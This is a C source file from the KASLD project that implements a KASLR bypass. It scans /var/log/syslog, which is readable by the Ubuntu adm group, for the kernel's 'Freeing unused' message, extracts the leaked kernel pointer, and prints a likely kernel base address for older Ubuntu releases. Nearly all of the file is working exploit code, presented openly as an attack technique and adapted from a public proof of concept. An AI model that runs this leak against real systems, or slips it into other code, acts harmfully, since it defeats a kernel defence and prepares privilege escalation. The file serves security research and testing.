// This file is part of KASLD - https://github.com/bcoles/kasld
// free_reserved_area() syslog KASLR bypass
// On Ubuntu systems, `kernel.dmesg_restrict` can be bypassed by
// users in the `adm` group, due to file read permissions on log
// files in `/var/log/`.
//
// $ ls -la /var/log/syslog /var/log/kern.log
// -rw-r----- 1 syslog adm 1916625 Dec 31 04:24 /var/log/kern.log
// -rw-r----- 1 syslog adm 1115029 Dec 31 04:24 /var/log/syslog
//
// free_reserved_area() leak was patched in 2016:
// - https://lore.kernel.org/patchwork/patch/728905/
// Mostly taken from original code by xairy:
// - https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-1000112/poc.c

#define _GNU_SOURCE

#include <fcntl.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/utsname.h>

// https://www.kernel.org/doc/Documentation/x86/x86_64/mm.txt
unsigned long KERNEL_BASE_MIN = 0xffffffff80000000ul;
unsigned long KERNEL_BASE_MAX = 0xffffffffff000000ul;

struct utsname get_kernel_version() {
  struct utsname u;
  if (uname(&u) != 0) {
    printf("[-] uname(): %m\n");
    exit(1);
  }
  return u;
}

#define CHUNK_SIZE 1024

unsigned long get_kernel_addr_free_reserved_area_syslog() {
  FILE *f;
  char *path = "/var/log/syslog";
  unsigned long addr = 0;
  char buff[CHUNK_SIZE];

  printf("[.] checking %s for free_reserved_area() info ...\n", path);

  f = fopen(path, "rb");
  if (f == NULL) {
    printf("[-] open/read(%s): %m\n", path);
    return 0;
  }

  while((fgets(buff, CHUNK_SIZE, f)) != NULL) {
    const char* needle1 = "Freeing unused";
    char* substr = (char*)memmem(&buff[0], CHUNK_SIZE, needle1, strlen(needle1));

    if (substr == NULL)
      continue;

    int start = 0;
    int end = 0;
    for (start = 0; substr[start] != '-'; start++);
    for (end = start; substr[end] != '\n'; end++);

    const char* needle2 = "ffffff";
    substr = (char*)memmem(&substr[start], end - start, needle2, strlen(needle2));

    if (substr == NULL)
      continue;

    char* endptr = &substr[16];
    addr = strtoul(&substr[0], &endptr, 16);
    break;
  }

  fclose(f);

  if (addr > KERNEL_BASE_MIN && addr < KERNEL_BASE_MAX)
    return addr;

  return 0;
}

int main (int argc, char **argv) {
  unsigned long addr = 0;

  struct utsname u = get_kernel_version();

  if (strstr(u.machine, "64") == NULL) {
    printf("[-] unsupported: system is not 64-bit.\n");
    exit(1);
  }

  addr = get_kernel_addr_free_reserved_area_syslog();
  if (!addr) return 1;

  printf("leaked address: %lx\n", addr);

  /* ubuntu trusty */
  printf("kernel base (likely): %lx\n", addr & 0xffffffffff000000ul);

  /* ubuntu xenial */
  printf("kernel base (likely): %lx\n", (addr & 0xfffffffffff00000ul) - 0x1000000ul);

  return 0;
}

